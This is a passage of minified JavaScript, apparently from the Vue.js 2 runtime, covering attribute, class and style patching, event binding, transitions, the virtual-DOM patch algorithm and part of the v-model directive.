Dn=A("style,class"),Rn=A("input,textarea,option,select,progress"),jn=function(e,t,n){return"value"===n&&Rn(e)&&"button"!==t||"selected"===n&&"option"===e||"checked"===n&&"input"===e||"muted"===n&&"video"===e},Un=A("contenteditable,draggable,spellcheck"),$n=A("events,caret,typing,plaintext-only"),zn=A("allowfullscreen,async,autofocus,autoplay,checked,compact,controls,declare,default,defaultchecked,defaultmuted,defaultselected,defer,disabled,enabled,formnovalidate,hidden,indeterminate,inert,ismap,itemscope,loop,multiple,muted,nohref,noresize,noshade,novalidate,nowrap,open,pauseonexit,readonly,required,reversed,scoped,seamless,selected,sortable,translate,truespeed,typemustmatch,visible"),Hn="http://www.w3.org/1999/xlink",Vn=function(e){return":"===e.charAt(5)&&"xlink"===e.slice(0,5)},Qn=function(e){return Vn(e)?e.slice(6,e.length):""},Gn=function(e){return null==e||!1===e};function Wn(e,t){return{staticClass:Kn(e.staticClass,t.staticClass),class:a(e.class)?[e.class,t.class]:t.class}}function Kn(e,t){return e?t?e+" "+t:e:t||""}function qn(e){return Array.isArray(e)?function(e){for(var t,n="",r=0,i=e.length;r<i;r++)a(t=qn(e[r]))&&""!==t&&(n&&(n+=" "),n+=t);return n}(e):l(e)?function(e){var t="";for(var n in e)e[n]&&(t&&(t+=" "),t+=n);return t}(e):"string"==typeof e?e:""}var Xn={svg:"http://www.w3.org/2000/svg",math:"http://www.w3.org/1998/Math/MathML"},Yn=A("html,body,base,head,link,meta,style,title,address,article,aside,footer,header,h1,h2,h3,h4,h5,h6,hgroup,nav,section,div,dd,dl,dt,figcaption,figure,picture,hr,img,li,main,ol,p,pre,ul,a,b,abbr,bdi,bdo,br,cite,code,data,dfn,em,i,kbd,mark,q,rp,rt,rtc,ruby,s,samp,small,span,strong,sub,sup,time,u,var,wbr,area,audio,map,track,video,embed,object,param,source,canvas,script,noscript,del,ins,caption,col,colgroup,table,thead,tbody,td,th,tr,button,datalist,fieldset,form,input,label,legend,meter,optgroup,option,output,progress,select,textarea,details,dialog,menu,menuitem,summary,content,element,shadow,template,blockquote,iframe,tfoot"),Jn=A("svg,animate,circle,clippath,cursor,defs,desc,ellipse,filter,font-face,foreignObject,g,glyph,image,line,marker,mask,missing-glyph,path,pattern,polygon,polyline,rect,switch,symbol,text,textpath,tspan,use,view",!0),Zn=function(e){return Yn(e)||Jn(e)};function er(e){return Jn(e)?"svg":"math"===e?"math":void 0}var tr=Object.create(null),nr=A("text,number,password,search,email,tel,url");function rr(e){return"string"!=typeof e?e:document.querySelector(e)||document.createElement("div")}var ir=Object.freeze({createElement:function(e,t){var n=document.createElement(e);return"select"!==e||t.data&&t.data.attrs&&void 0!==t.data.attrs.multiple&&n.setAttribute("multiple","multiple"),n},createElementNS:function(e,t){return document.createElementNS(Xn[e],t)},createTextNode:function(e){return document.createTextNode(e)},createComment:function(e){return document.createComment(e)},insertBefore:function(e,t,n){e.insertBefore(t,n)},removeChild:function(e,t){e.removeChild(t)},appendChild:function(e,t){e.appendChild(t)},parentNode:function(e){return e.parentNode},nextSibling:function(e){return e.nextSibling},tagName:function(e){return e.tagName},setTextContent:function(e,t){e.textContent=t},setStyleScope:function(e,t){e.setAttribute(t,"")}}),ar={create:function(e,t){or(t)},update:function(e,t){e.data.ref!==t.data.ref&&(or(e,!0),or(t))},destroy:function(e){or(e,!0)}};function or(e,t){var n=e.data.ref;if(a(n)){var r=e.context,i=e.componentInstance||e.elm,o=r.$refs;t?Array.isArray(o[n])?g(o[n],i):o[n]===i&&(o[n]=void 0):e.data.refInFor?Array.isArray(o[n])?o[n].indexOf(i)<0&&o[n].push(i):o[n]=[i]:o[n]=i}}var sr=new Ae("",{},[]),lr=["create","activate","update","remove","destroy"];function cr(e,t){return e.key===t.key&&(e.tag===t.tag&&e.isComment===t.isComment&&a(e.data)===a(t.data)&&function(e,t){if("input"!==e.tag)return!0;var n,r=a(n=e.data)&&a(n=n.attrs)&&n.type,i=a(n=t.data)&&a(n=n.attrs)&&n.type;return r===i||nr(r)&&nr(i)}(e,t)||o(e.isAsyncPlaceholder)&&e.asyncFactory===t.asyncFactory&&i(t.asyncFactory.error))}function ur(e,t,n){var r,i,o={};for(r=t;r<=n;++r)a(i=e[r].key)&&(o[i]=r);return o}var dr={create:pr,update:pr,destroy:function(e){pr(e,sr)}};function pr(e,t){(e.data.directives||t.data.directives)&&function(e,t){var n,r,i,a=e===sr,o=t===sr,s=fr(e.data.directives,e.context),l=fr(t.data.directives,t.context),c=[],u=[];for(n in l)r=s[n],i=l[n],r?(i.oldValue=r.value,i.oldArg=r.arg,Ar(i,"update",t,e),i.def&&i.def.componentUpdated&&u.push(i)):(Ar(i,"bind",t,e),i.def&&i.def.inserted&&c.push(i));if(c.length){var d=function(){for(var n=0;n<c.length;n++)Ar(c[n],"inserted",t,e)};a?st(t,"insert",d):d()}if(u.length&&st(t,"postpatch",(function(){for(var n=0;n<u.length;n++)Ar(u[n],"componentUpdated",t,e)})),!a)for(n in s)l[n]||Ar(s[n],"unbind",e,e,o)}(e,t)}var hr=Object.create(null);function fr(e,t){var n,r,i,a=Object.create(null);if(!e)return a;for(n=0;n<e.length;n++)(r=e[n]).modifiers||(r.modifiers=hr),(a[(i=r,i.rawName||i.name+"."+Object.keys(i.modifiers||{}).join("."))]=r).def=De(t.$options,"directives",r.name);return a}function Ar(e,t,n,r,i){var a=e.def&&e.def[t];if(a)try{a(n.elm,e,n,r,i)}catch(r){ze(r,n.context,"directive "+e.name+" "+t+" hook")}}var mr=[ar,dr];function vr(e,t){var n=t.componentOptions;if(!(a(n)&&!1===n.Ctor.options.inheritAttrs||i(e.data.attrs)&&i(t.data.attrs))){var r,o,s=t.elm,l=e.data.attrs||{},c=t.data.attrs||{};for(r in a(c.__ob__)&&(c=t.data.attrs=E({},c)),c)o=c[r],l[r]!==o&&gr(s,r,o);for(r in(X||J)&&c.value!==l.value&&gr(s,"value",c.value),l)i(c[r])&&(Vn(r)?s.removeAttributeNS(Hn,Qn(r)):Un(r)||s.removeAttribute(r))}}function gr(e,t,n){-1<e.tagName.indexOf("-")?yr(e,t,n):zn(t)?Gn(n)?e.removeAttribute(t):(n="allowfullscreen"===t&&"EMBED"===e.tagName?"true":t,e.setAttribute(t,n)):Un(t)?e.setAttribute(t,function(e,t){return Gn(t)||"false"===t?"false":"contenteditable"===e&&$n(t)?t:"true"}(t,n)):Vn(t)?Gn(n)?e.removeAttributeNS(Hn,Qn(t)):e.setAttributeNS(Hn,t,n):yr(e,t,n)}function yr(e,t,n){Gn(n)?e.removeAttribute(t):(!X||Y||"TEXTAREA"!==e.tagName||"placeholder"!==t||""===n||e.__ieph||(e.addEventListener("input",(function t(n){n.stopImmediatePropagation(),e.removeEventListener("input",t)})),e.__ieph=!0),e.setAttribute(t,n))}var br={create:vr,update:vr};function _r(e,t){var n=t.elm,r=t.data,o=e.data;if(!(i(r.staticClass)&&i(r.class)&&(i(o)||i(o.staticClass)&&i(o.class)))){var s=function(e){for(var t=e.data,n=e,r=e;a(r.componentInstance);)(r=r.componentInstance._vnode)&&r.data&&(t=Wn(r.data,t));for(;a(n=n.parent);)n&&n.data&&(t=Wn(t,n.data));return i=t.staticClass,o=t.class,a(i)||a(o)?Kn(i,qn(o)):"";var i,o}(t),l=n._transitionClasses;a(l)&&(s=Kn(s,qn(l))),s!==n._prevClass&&(n.setAttribute("class",s),n._prevClass=s)}}var wr,Cr,xr,Sr,kr,Mr,Br,Er={create:_r,update:_r},Tr=/[\w).+\-_$\]]/;function Pr(e){var t,n,r,i,a,o=!1,s=!1,l=!1,c=!1,u=0,d=0,p=0,h=0;for(r=0;r<e.length;r++)if(n=t,t=e.charCodeAt(r),o)39===t&&92!==n&&(o=!1);else if(s)34===t&&92!==n&&(s=!1);else if(l)96===t&&92!==n&&(l=!1);else if(c)47===t&&92!==n&&(c=!1);else if(124!==t||124===e.charCodeAt(r+1)||124===e.charCodeAt(r-1)||u||d||p){switch(t){case 34:s=!0;break;case 39:o=!0;break;case 96:l=!0;break;case 40:p++;break;case 41:p--;break;case 91:d++;break;case 93:d--;break;case 123:u++;break;case 125:u--}if(47===t){for(var f=r-1,A=void 0;0<=f&&" "===(A=e.charAt(f));f--);A&&Tr.test(A)||(c=!0)}}else void 0===i?(h=r+1,i=e.slice(0,r).trim()):m();function m(){(a||(a=[])).push(e.slice(h,r).trim()),h=r+1}if(void 0===i?i=e.slice(0,r).trim():0!==h&&m(),a)for(r=0;r<a.length;r++)i=Ir(i,a[r]);return i}function Ir(e,t){var n=t.indexOf("(");if(n<0)return'_f("'+t+'")('+e+")";var r=t.slice(0,n),i=t.slice(n+1);return'_f("'+r+'")('+e+(")"!==i?","+i:i)}function Fr(e,t){}function Lr(e,t){return e?e.map((function(e){return e[t]})).filter((function(e){return e})):[]}function Or(e,t,n,r,i){(e.props||(e.props=[])).push(Hr({name:t,value:n,dynamic:i},r)),e.plain=!1}function Nr(e,t,n,r,i){(i?e.dynamicAttrs||(e.dynamicAttrs=[]):e.attrs||(e.attrs=[])).push(Hr({name:t,value:n,dynamic:i},r)),e.plain=!1}function Dr(e,t,n,r){e.attrsMap[t]=n,e.attrsList.push(Hr({name:t,value:n},r))}function Rr(e,t,n){return n?"_p("+t+',"'+e+'")':e+t}function jr(e,t,n,i,a,o,s,l){var c;(i=i||r).right?l?t="("+t+")==='click'?'contextmenu':("+t+")":"click"===t&&(t="contextmenu",delete i.right):i.middle&&(l?t="("+t+")==='click'?'mouseup':("+t+")":"click"===t&&(t="mouseup")),i.capture&&(delete i.capture,t=Rr("!",t,l)),i.once&&(delete i.once,t=Rr("~",t,l)),i.passive&&(delete i.passive,t=Rr("&",t,l)),c=i.native?(delete i.native,e.nativeEvents||(e.nativeEvents={})):e.events||(e.events={});var u=Hr({value:n.trim(),dynamic:l},s);i!==r&&(u.modifiers=i);var d=c[t];Array.isArray(d)?a?d.unshift(u):d.push(u):c[t]=d?a?[u,d]:[d,u]:u,e.plain=!1}function Ur(e,t,n){var r=$r(e,":"+t)||$r(e,"v-bind:"+t);if(null!=r)return Pr(r);if(!1!==n){var i=$r(e,t);if(null!=i)return JSON.stringify(i)}}function $r(e,t,n){var r;if(null!=(r=e.attrsMap[t]))for(var i=e.attrsList,a=0,o=i.length;a<o;a++)if(i[a].name===t){i.splice(a,1);break}return n&&delete e.attrsMap[t],r}function zr(e,t){for(var n=e.attrsList,r=0,i=n.length;r<i;r++){var a=n[r];if(t.test(a.name))return n.splice(r,1),a}}function Hr(e,t){return t&&(null!=t.start&&(e.start=t.start),null!=t.end&&(e.end=t.end)),e}function Vr(e,t,n){var r=n||{},i=r.number,a="$$v";r.trim&&(a="(typeof $$v === 'string'? $$v.trim(): $$v)"),i&&(a="_n("+a+")");var o=Qr(t,a);e.model={value:"("+t+")",expression:JSON.stringify(t),callback:"function ($$v) {"+o+"}"}}function Qr(e,t){var n=function(e){if(e=e.trim(),wr=e.length,e.indexOf("[")<0||e.lastIndexOf("]")<wr-1)return-1<(Sr=e.lastIndexOf("."))?{exp:e.slice(0,Sr),key:'"'+e.slice(Sr+1)+'"'}:{exp:e,key:null};for(Cr=e,Sr=kr=Mr=0;!Wr();)Kr(xr=Gr())?Xr(xr):91===xr&&qr(xr);return{exp:e.slice(0,kr),key:e.slice(kr+1,Mr)}}(e);return null===n.key?e+"="+t:"$set("+n.exp+", "+n.key+", "+t+")"}function Gr(){return Cr.charCodeAt(++Sr)}function Wr(){return wr<=Sr}function Kr(e){return 34===e||39===e}function qr(e){var t=1;for(kr=Sr;!Wr();)if(Kr(e=Gr()))Xr(e);else if(91===e&&t++,93===e&&t--,0===t){Mr=Sr;break}}function Xr(e){for(var t=e;!Wr()&&(e=Gr())!==t;);}function Yr(e,t,n){var r=Br;return function i(){null!==t.apply(null,arguments)&&ei(e,i,n,r)}}var Jr=We&&!(ee&&Number(ee[1])<=53);function Zr(e,t,n,r){if(Jr){var i=sn,a=t;t=a._wrapper=function(e){if(e.target===e.currentTarget||e.timeStamp>=i||e.timeStamp<=0||e.target.ownerDocument!==document)return a.apply(this,arguments)}}Br.addEventListener(e,t,ne?{capture:n,passive:r}:n)}function ei(e,t,n,r){(r||Br).removeEventListener(e,t._wrapper||t,n)}function ti(e,t){if(!i(e.data.on)||!i(t.data.on)){var n=t.data.on||{},r=e.data.on||{};Br=t.elm,function(e){if(a(e.__r)){var t=X?"change":"input";e[t]=[].concat(e.__r,e[t]||[]),delete e.__r}a(e.__c)&&(e.change=[].concat(e.__c,e.change||[]),delete e.__c)}(n),ot(n,r,Zr,ei,Yr,t.context),Br=void 0}}var ni,ri={create:ti,update:ti};function ii(e,t){if(!i(e.data.domProps)||!i(t.data.domProps)){var n,r,o=t.elm,s=e.data.domProps||{},l=t.data.domProps||{};for(n in a(l.__ob__)&&(l=t.data.domProps=E({},l)),s)n in l||(o[n]="");for(n in l){if(r=l[n],"textContent"===n||"innerHTML"===n){if(t.children&&(t.children.length=0),r===s[n])continue;1===o.childNodes.length&&o.removeChild(o.childNodes[0])}if("value"===n&&"PROGRESS"!==o.tagName){var c=i(o._value=r)?"":String(r);p=c,!(d=o).composing&&("OPTION"===d.tagName||function(e,t){var n=!0;try{n=document.activeElement!==e}catch(e){}return n&&e.value!==t}(d,p)||function(e,t){var n=e.value,r=e._vModifiers;if(a(r)){if(r.number)return f(n)!==f(t);if(r.trim)return n.trim()!==t.trim()}return n!==t}(d,p))&&(o.value=c)}else if("innerHTML"===n&&Jn(o.tagName)&&i(o.innerHTML)){(ni=ni||document.createElement("div")).innerHTML="<svg>"+r+"</svg>";for(var u=ni.firstChild;o.firstChild;)o.removeChild(o.firstChild);for(;u.firstChild;)o.appendChild(u.firstChild)}else if(r!==s[n])try{o[n]=r}catch(e){}}}var d,p}var ai={create:ii,update:ii},oi=_((function(e){var t={},n=/:(.+)/;return e.split(/;(?![^(]*\))/g).forEach((function(e){if(e){var r=e.split(n);1<r.length&&(t[r[0].trim()]=r[1].trim())}})),t}));function si(e){var t=li(e.style);return e.staticStyle?E(e.staticStyle,t):t}function li(e){return Array.isArray(e)?T(e):"string"==typeof e?oi(e):e}var ci,ui=/^--/,di=/\s*!important$/,pi=function(e,t,n){if(ui.test(t))e.style.setProperty(t,n);else if(di.test(n))e.style.setProperty(k(t),n.replace(di,""),"important");else{var r=fi(t);if(Array.isArray(n))for(var i=0,a=n.length;i<a;i++)e.style[r]=n[i];else e.style[r]=n}},hi=["Webkit","Moz","ms"],fi=_((function(e){if(ci=ci||document.createElement("div").style,"filter"!==(e=C(e))&&e in ci)return e;for(var t=e.charAt(0).toUpperCase()+e.slice(1),n=0;n<hi.length;n++){var r=hi[n]+t;if(r in ci)return r}}));function Ai(e,t){var n=t.data,r=e.data;if(!(i(n.staticStyle)&&i(n.style)&&i(r.staticStyle)&&i(r.style))){var o,s,l=t.elm,c=r.staticStyle,u=r.normalizedStyle||r.style||{},d=c||u,p=li(t.data.style)||{};t.data.normalizedStyle=a(p.__ob__)?E({},p):p;var h=function(e,t){for(var n,r={},i=e;i.componentInstance;)(i=i.componentInstance._vnode)&&i.data&&(n=si(i.data))&&E(r,n);(n=si(e.data))&&E(r,n);for(var a=e;a=a.parent;)a.data&&(n=si(a.data))&&E(r,n);return r}(t);for(s in d)i(h[s])&&pi(l,s,"");for(s in h)(o=h[s])!==d[s]&&pi(l,s,null==o?"":o)}}var mi={create:Ai,update:Ai},vi=/\s+/;function gi(e,t){if(t&&(t=t.trim()))if(e.classList)-1<t.indexOf(" ")?t.split(vi).forEach((function(t){return e.classList.add(t)})):e.classList.add(t);else{var n=" "+(e.getAttribute("class")||"")+" ";n.indexOf(" "+t+" ")<0&&e.setAttribute("class",(n+t).trim())}}function yi(e,t){if(t&&(t=t.trim()))if(e.classList)-1<t.indexOf(" ")?t.split(vi).forEach((function(t){return e.classList.remove(t)})):e.classList.remove(t),e.classList.length||e.removeAttribute("class");else{for(var n=" "+(e.getAttribute("class")||"")+" ",r=" "+t+" ";0<=n.indexOf(r);)n=n.replace(r," ");(n=n.trim())?e.setAttribute("class",n):e.removeAttribute("class")}}function bi(e){if(e){if("object"!=_typeof2(e))return"string"==typeof e?_i(e):void 0;var t={};return!1!==e.css&&E(t,_i(e.name||"v")),E(t,e),t}}var _i=_((function(e){return{enterClass:e+"-enter",enterToClass:e+"-enter-to",enterActiveClass:e+"-enter-active",leaveClass:e+"-leave",leaveToClass:e+"-leave-to",leaveActiveClass:e+"-leave-active"}})),wi=G&&!Y,Ci="transition",xi="animation",Si="transition",ki="transitionend",Mi="animation",Bi="animationend";wi&&(void 0===window.ontransitionend&&void 0!==window.onwebkittransitionend&&(Si="WebkitTransition",ki="webkitTransitionEnd"),void 0===window.onanimationend&&void 0!==window.onwebkitanimationend&&(Mi="WebkitAnimation",Bi="webkitAnimationEnd"));var Ei=G?window.requestAnimationFrame?window.requestAnimationFrame.bind(window):setTimeout:function(e){return e()};function Ti(e){Ei((function(){Ei(e)}))}function Pi(e,t){var n=e._transitionClasses||(e._transitionClasses=[]);n.indexOf(t)<0&&(n.push(t),gi(e,t))}function Ii(e,t){e._transitionClasses&&g(e._transitionClasses,t),yi(e,t)}function Fi(e,t,n){var r=Oi(e,t),i=r.type,a=r.timeout,o=r.propCount;if(!i)return n();var s=i===Ci?ki:Bi,l=0,c=function(){e.removeEventListener(s,u),n()},u=function(t){t.target===e&&++l>=o&&c()};setTimeout((function(){l<o&&c()}),a+1),e.addEventListener(s,u)}var Li=/\b(transform|all)(,|$)/;function Oi(e,t){var n,r=window.getComputedStyle(e),i=(r[Si+"Delay"]||"").split(", "),a=(r[Si+"Duration"]||"").split(", "),o=Ni(i,a),s=(r[Mi+"Delay"]||"").split(", "),l=(r[Mi+"Duration"]||"").split(", "),c=Ni(s,l),u=0,d=0;return t===Ci?0<o&&(n=Ci,u=o,d=a.length):t===xi?0<c&&(n=xi,u=c,d=l.length):d=(n=0<(u=Math.max(o,c))?c<o?Ci:xi:null)?n===Ci?a.length:l.length:0,{type:n,timeout:u,propCount:d,hasTransform:n===Ci&&Li.test(r[Si+"Property"])}}function Ni(e,t){for(;e.length<t.length;)e=e.concat(e);return Math.max.apply(null,t.map((function(t,n){return Di(t)+Di(e[n])})))}function Di(e){return 1e3*Number(e.slice(0,-1).replace(",","."))}function Ri(e,t){var n=e.elm;a(n._leaveCb)&&(n._leaveCb.cancelled=!0,n._leaveCb());var r=bi(e.data.transition);if(!i(r)&&!a(n._enterCb)&&1===n.nodeType){for(var o=r.css,s=r.type,c=r.enterClass,u=r.enterToClass,d=r.enterActiveClass,p=r.appearClass,h=r.appearToClass,A=r.appearActiveClass,m=r.beforeEnter,v=r.enter,g=r.afterEnter,y=r.enterCancelled,b=r.beforeAppear,_=r.appear,w=r.afterAppear,C=r.appearCancelled,x=r.duration,S=qt,k=qt.$vnode;k&&k.parent;)S=k.context,k=k.parent;var M=!S._isMounted||!e.isRootInsert;if(!M||_||""===_){var B=M&&p?p:c,E=M&&A?A:d,T=M&&h?h:u,P=M&&b||m,I=M&&"function"==typeof _?_:v,F=M&&w||g,L=M&&C||y,O=f(l(x)?x.enter:x),D=!1!==o&&!Y,R=$i(I),j=n._enterCb=N((function(){D&&(Ii(n,T),Ii(n,E)),j.cancelled?(D&&Ii(n,B),L&&L(n)):F&&F(n),n._enterCb=null}));e.data.show||st(e,"insert",(function(){var t=n.parentNode,r=t&&t._pending&&t._pending[e.key];r&&r.tag===e.tag&&r.elm._leaveCb&&r.elm._leaveCb(),I&&I(n,j)})),P&&P(n),D&&(Pi(n,B),Pi(n,E),Ti((function(){Ii(n,B),j.cancelled||(Pi(n,T),R||(Ui(O)?setTimeout(j,O):Fi(n,s,j)))}))),e.data.show&&(t&&t(),I&&I(n,j)),D||R||j()}}}function ji(e,t){var n=e.elm;a(n._enterCb)&&(n._enterCb.cancelled=!0,n._enterCb());var r=bi(e.data.transition);if(i(r)||1!==n.nodeType)return t();if(!a(n._leaveCb)){var o=r.css,s=r.type,c=r.leaveClass,u=r.leaveToClass,d=r.leaveActiveClass,p=r.beforeLeave,h=r.leave,A=r.afterLeave,m=r.leaveCancelled,v=r.delayLeave,g=r.duration,y=!1!==o&&!Y,b=$i(h),_=f(l(g)?g.leave:g),w=n._leaveCb=N((function(){n.parentNode&&n.parentNode._pending&&(n.parentNode._pending[e.key]=null),y&&(Ii(n,u),Ii(n,d)),w.cancelled?(y&&Ii(n,c),m&&m(n)):(t(),A&&A(n)),n._leaveCb=null}));v?v(C):C()}function C(){w.cancelled||(!e.data.show&&n.parentNode&&((n.parentNode._pending||(n.parentNode._pending={}))[e.key]=e),p&&p(n),y&&(Pi(n,c),Pi(n,d),Ti((function(){Ii(n,c),w.cancelled||(Pi(n,u),b||(Ui(_)?setTimeout(w,_):Fi(n,s,w)))}))),h&&h(n,w),y||b||w())}}function Ui(e){return"number"==typeof e&&!isNaN(e)}function $i(e){if(i(e))return!1;var t=e.fns;return a(t)?$i(Array.isArray(t)?t[0]:t):1<(e._length||e.length)}function zi(e,t){!0!==t.data.show&&Ri(t)}var Hi=function(e){var t,n,r={},l=e.modules,c=e.nodeOps;for(t=0;t<lr.length;++t)for(r[lr[t]]=[],n=0;n<l.length;++n)a(l[n][lr[t]])&&r[lr[t]].push(l[n][lr[t]]);function u(e){var t=c.parentNode(e);a(t)&&c.removeChild(t,e)}function d(e,t,n,i,s,l,u){if(a(e.elm)&&a(l)&&(e=l[u]=ye(e)),e.isRootInsert=!s,!function(e,t,n,i){var s=e.data;if(a(s)){var l=a(e.componentInstance)&&s.keepAlive;if(a(s=s.hook)&&a(s=s.init)&&s(e,!1),a(e.componentInstance))return p(e,t),h(n,e.elm,i),o(l)&&function(e,t,n,i){for(var o,s=e;s.componentInstance;)if(a(o=(s=s.componentInstance._vnode).data)&&a(o=o.transition)){for(o=0;o<r.activate.length;++o)r.activate[o](sr,s);t.push(s);break}h(n,e.elm,i)}(e,t,n,i),!0}}(e,t,n,i)){var d=e.data,A=e.children,m=e.tag;a(m)?(e.elm=e.ns?c.createElementNS(e.ns,m):c.createElement(m,e),g(e),f(e,A,t),a(d)&&v(e,t)):o(e.isComment)?e.elm=c.createComment(e.text):e.elm=c.createTextNode(e.text),h(n,e.elm,i)}}function p(e,t){a(e.data.pendingInsert)&&(t.push.apply(t,e.data.pendingInsert),e.data.pendingInsert=null),e.elm=e.componentInstance.$el,m(e)?(v(e,t),g(e)):(or(e),t.push(e))}function h(e,t,n){a(e)&&(a(n)?c.parentNode(n)===e&&c.insertBefore(e,t,n):c.appendChild(e,t))}function f(e,t,n){if(Array.isArray(t))for(var r=0;r<t.length;++r)d(t[r],n,e.elm,null,!0,t,r);else s(e.text)&&c.appendChild(e.elm,c.createTextNode(String(e.text)))}function m(e){for(;e.componentInstance;)e=e.componentInstance._vnode;return a(e.tag)}function v(e,n){for(var i=0;i<r.create.length;++i)r.create[i](sr,e);a(t=e.data.hook)&&(a(t.create)&&t.create(sr,e),a(t.insert)&&n.push(e))}function g(e){var t;if(a(t=e.fnScopeId))c.setStyleScope(e.elm,t);else for(var n=e;n;)a(t=n.context)&&a(t=t.$options._scopeId)&&c.setStyleScope(e.elm,t),n=n.parent;a(t=qt)&&t!==e.context&&t!==e.fnContext&&a(t=t.$options._scopeId)&&c.setStyleScope(e.elm,t)}function y(e,t,n,r,i,a){for(;r<=i;++r)d(n[r],a,e,t,!1,n,r)}function b(e){var t,n,i=e.data;if(a(i))for(a(t=i.hook)&&a(t=t.destroy)&&t(e),t=0;t<r.destroy.length;++t)r.destroy[t](e);if(a(t=e.children))for(n=0;n<e.children.length;++n)b(e.children[n])}function _(e,t,n){for(;t<=n;++t){var r=e[t];a(r)&&(a(r.tag)?(w(r),b(r)):u(r.elm))}}function w(e,t){if(a(t)||a(e.data)){var n,i=r.remove.length+1;for(a(t)?t.listeners+=i:t=function(e,t){function n(){0==--n.listeners&&u(e)}return n.listeners=i,n}(e.elm),a(n=e.componentInstance)&&a(n=n._vnode)&&a(n.data)&&w(n,t),n=0;n<r.remove.length;++n)r.remove[n](e,t);a(n=e.data.hook)&&a(n=n.remove)?n(e,t):t()}else u(e.elm)}function C(e,t,n,r){for(var i=n;i<r;i++){var o=t[i];if(a(o)&&cr(e,o))return i}}function x(e,t,n){if(o(n)&&a(e.parent))e.parent.data.pendingInsert=t;else for(var r=0;r<t.length;++r)t[r].data.hook.insert(t[r])}var S=A("attrs,class,staticClass,staticStyle,key");function k(e,t,n,r){var i,s=t.tag,l=t.data,c=t.children;if(r=r||l&&l.pre,t.elm=e,o(t.isComment)&&a(t.asyncFactory))return t.isAsyncPlaceholder=!0;if(a(l)&&(a(i=l.hook)&&a(i=i.init)&&i(t,!0),a(i=t.componentInstance)))return p(t,n),!0;if(a(s)){if(a(c))if(e.hasChildNodes())if(a(i=l)&&a(i=i.domProps)&&a(i=i.innerHTML)){if(i!==e.innerHTML)return!1}else{for(var u=!0,d=e.firstChild,h=0;h<c.length;h++){if(!d||!k(d,c[h],n,r)){u=!1;break}d=d.nextSibling}if(!u||d)return!1}else f(t,c,n);if(a(l)){var A=!1;for(var m in l)if(!S(m)){A=!0,v(t,n);break}!A&&l.class&&rt(l.class)}}else e.data!==t.text&&(e.data=t.text);return!0}return function(e,t,n,s){if(!i(t)){var l,u=!1,p=[];if(i(e))u=!0,d(t,p);else{var h=a(e.nodeType);if(!h&&cr(e,t))!function e(t,n,s,l,u,p){if(t!==n){a(n.elm)&&a(l)&&(n=l[u]=ye(n));var h=n.elm=t.elm;if(o(t.isAsyncPlaceholder))a(n.asyncFactory.resolved)?k(t.elm,n,s):n.isAsyncPlaceholder=!0;else if(o(n.isStatic)&&o(t.isStatic)&&n.key===t.key&&(o(n.isCloned)||o(n.isOnce)))n.componentInstance=t.componentInstance;else{var f,A=n.data;a(A)&&a(f=A.hook)&&a(f=f.prepatch)&&f(t,n);var v=t.children,g=n.children;if(a(A)&&m(n)){for(f=0;f<r.update.length;++f)r.update[f](t,n);a(f=A.hook)&&a(f=f.update)&&f(t,n)}i(n.text)?a(v)&&a(g)?v!==g&&function(t,n,r,o,s){for(var l,u,p,h=0,f=0,A=n.length-1,m=n[0],v=n[A],g=r.length-1,b=r[0],w=r[g],x=!s;h<=A&&f<=g;)i(m)?m=n[++h]:i(v)?v=n[--A]:cr(m,b)?(e(m,b,o,r,f),m=n[++h],b=r[++f]):cr(v,w)?(e(v,w,o,r,g),v=n[--A],w=r[--g]):cr(m,w)?(e(m,w,o,r,g),x&&c.insertBefore(t,m.elm,c.nextSibling(v.elm)),m=n[++h],w=r[--g]):(cr(v,b)?(e(v,b,o,r,f),x&&c.insertBefore(t,v.elm,m.elm),v=n[--A]):(i(l)&&(l=ur(n,h,A)),i(u=a(b.key)?l[b.key]:C(b,n,h,A))?d(b,o,t,m.elm,!1,r,f):cr(p=n[u],b)?(e(p,b,o,r,f),n[u]=void 0,x&&c.insertBefore(t,p.elm,m.elm)):d(b,o,t,m.elm,!1,r,f)),b=r[++f]);A<h?y(t,i(r[g+1])?null:r[g+1].elm,r,f,g,o):g<f&&_(n,h,A)}(h,v,g,s,p):a(g)?(a(t.text)&&c.setTextContent(h,""),y(h,null,g,0,g.length-1,s)):a(v)?_(v,0,v.length-1):a(t.text)&&c.setTextContent(h,""):t.text!==n.text&&c.setTextContent(h,n.text),a(A)&&a(f=A.hook)&&a(f=f.postpatch)&&f(t,n)}}}(e,t,p,null,null,s);else{if(h){if(1===e.nodeType&&e.hasAttribute(D)&&(e.removeAttribute(D),n=!0),o(n)&&k(e,t,p))return x(t,p,!0),e;l=e,e=new Ae(c.tagName(l).toLowerCase(),{},[],void 0,l)}var f=e.elm,A=c.parentNode(f);if(d(t,p,f._leaveCb?null:A,c.nextSibling(f)),a(t.parent))for(var v=t.parent,g=m(t);v;){for(var w=0;w<r.destroy.length;++w)r.destroy[w](v);if(v.elm=t.elm,g){for(var S=0;S<r.create.length;++S)r.create[S](sr,v);var M=v.data.hook.insert;if(M.merged)for(var B=1;B<M.fns.length;B++)M.fns[B]()}else or(v);v=v.parent}a(A)?_([e],0,0):a(e.tag)&&b(e)}}return x(t,p,u),t.elm}a(e)&&b(e)}}({nodeOps:ir,modules:[br,Er,ri,ai,mi,G?{create:zi,activate:zi,remove:function(e,t){!0!==e.data.show?ji(e,t):t()}}:{}].concat(mr)});Y&&document.addEventListener("selectionchange",(function(){var e=document.activeElement;e&&e.vmodel&&Yi(e,"input")}));var Vi={inserted:function(e,t,n,r){"select"===n.tag?(r.elm&&!r.elm._vOptions?st(n,"postpatch",(function(){Vi.componentUpdated(e,t,n)})):Qi(e,t,n.context),e._vOptions=[].map.call(e.options,Ki)):("textarea"===n.tag||nr(e.type))&&(e._vModifiers=t.modifiers,t.modifiers.lazy||(e.addEventListener("compositionstart",qi),e.addEventListener("compositionend",Xi),e.addEventListener("change",Xi),Y&&(e.vmodel=!0)))},componentUpdated:function(e,t,n){if("select"===n.tag){Qi(e,t,n.context);var r=e._vOptions,i=e._vOptions=[].map.call(e.options,Ki);i.some((function(e,t){return!L(e,r[t])}))&&(e.multiple?t.value.some((function(e){return Wi(e,i)})):t.value!==t.oldValue&&Wi(t.value,i))&&Yi(e,"change")}}};function Qi(e,t,n){Gi(e,t,n),(X||J)&&setTimeout((function(){Gi(e,t,n)}),0)}function Gi(e,t,n){var r=t.value,i=e.multiple;if(!i||Array.isArray(r)){for(var a,o,s=0,l=e.options.length;s<l;s++)if(o=e.options[s],i)a=-1<O(r,Ki(o)),o.selected!==a&&(o.selected=a);else if(L(Ki(o),r))return void(e.selectedIndex!==s&&(e.selectedIndex=s));i||(e.selectedIndex=-1)}}function Wi(e,t){return t.every((function(t){return!L(t,e)}))}function Ki(e){return"_value"in 